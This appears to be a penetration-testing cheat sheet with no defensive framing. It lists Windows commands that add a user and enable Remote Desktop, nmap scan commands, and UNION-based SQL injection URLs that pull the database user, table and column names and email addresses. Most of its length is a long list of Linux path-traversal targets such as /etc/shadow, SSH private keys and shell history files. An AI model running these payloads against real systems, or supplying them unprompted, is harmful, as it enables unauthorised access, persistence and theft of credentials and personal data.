
### Windows Commands

1. Create user, the command is 
net user {username} {password}


examples:

```CMD
net user lucas pw1234
```

2. Eable remote desktop service 

```CMD
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

3. Switch user

```CMD
runas /user:lucas cmd
```

### NMAP Command

1. Common ports 
```CMD
nmap -sS -P0  -A -oA 192.168.100.1 -T4 192.168.100.1
```

2. Full ports
```CMD
 nmap -sS -P0 -p- -A -oA 192.168.100.1.log -T4 192.168.100.1
```

### Common SQL Injection Command
	
	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2,user()  --%20



	
	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2, ( SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1 )--%20




	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2, ( SELECT column_name FROM information_schema.columns WHERE table_name='accounts' limit 0,1 )--%20




	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2, ( SELECT email FROM   accounts limit 0,1 )--%20

### Linux Command

1. base64 decode
```SH
echo "aGVsbG8=" | base64 -d 
```

### Traversal Path for Linux


```SH
/apache/logs/access.log
/apache/logs/error.log
/etc/aliases
/etc/anacrontab
/etc/apache/apache.conf
/etc/apache/httpd.conf
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-available/default
/etc/apache2/vhosts.d/default_vhost.include
/etc/apache2/vhosts.d/default_vhost.includeproc/ioports
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/group
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/acces.log
/etc/httpd/logs/acces_log
/etc/httpd/logs/access.log
/etc/httpd/logs/access_log
/etc/httpd/logs/error.log
/etc/httpd/logs/error_log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/init.d/apache
/etc/init.d/apache2
/etc/inittab
/etc/issue
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php.ini
/etc/php/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/cgi/php.ini
/etc/php/php.ini
/etc/php/php4/php.ini
/etc/php4.4/fcgi/php.ini
/etc/php4/apache/php.ini
/etc/php4/apache2/php.ini
/etc/php4/cgi/php.ini
/etc/php5/apache/php.ini
/etc/php5/apache2/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/security/environ
/etc/security/group
/etc/security/limits
/etc/security/passwd
/etc/security/user
/etc/shadow
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/ssh/sshd_config
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/home/apache/conf/httpd.conf
/home/apache/httpd.conf
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/apache/conf/httpd.conf
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/pache/logs/error.log
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/meminfo
/proc/modules
/proc/mounts
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/lib/security/mkuser.default
/usr/local/Zend/etc/php.ini
/usr/local/apache/audit_log
/usr/local/apache/conf/httpd.conf
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/error.log
/usr/local/apache/error_log
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access. log
/usr/local/apache/logs/access.log
/usr/local/apache/logs/access_ log
/usr/local/apache/logs/access_log
/usr/local/apache/logs/error.l og
/usr/local/apache/logs/error_l og
/usr/local/apache2/conf/httpd.conf
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/apache2/config.inc
/var/cpanel/cpanel.config
/var/htmp
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/access.log
/var/log/access_log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/apache/access.log
/var/log/apache/access_log
/var/log/apache/error.log
/var/log/apache/error_log
/var/log/apache2/access.log
/var/log/apache2/access_log
/var/log/apache2/error.log
/var/log/apache2/error_log
/var/log/auth.log
/var/log/boot
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/error.log
/var/log/error_log
/var/log/exim.paniclog
/var/log/exim/mainlog
/var/log/exim/rejectlog
/var/log/exim_mainlog
/var/log/exim_paniclog
/var/log/exim_rejectlog
/var/log/faillog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/ftplog
/var/log/httpd/access.log
/var/log/httpd/access_log
/var/log/httpd/error.log
/var/log/httpd/error_log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/mail.warn
/var/log/maillog
/var/log/message
/var/log/messages
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql-slow.log
/var/log/mysql/mysql.log
/var/log/mysqlderror.log
/var/log/proftpd
/var/log/pure-ftpd/pure-ftpd.log
/var/log/pureftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access.log
/var/www/logs/access_log
/var/www/logs/error.log
/var/www/logs/error_log
~/.Xdefaults
~/.Xresources
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.xinitrc
~/.xsession
```
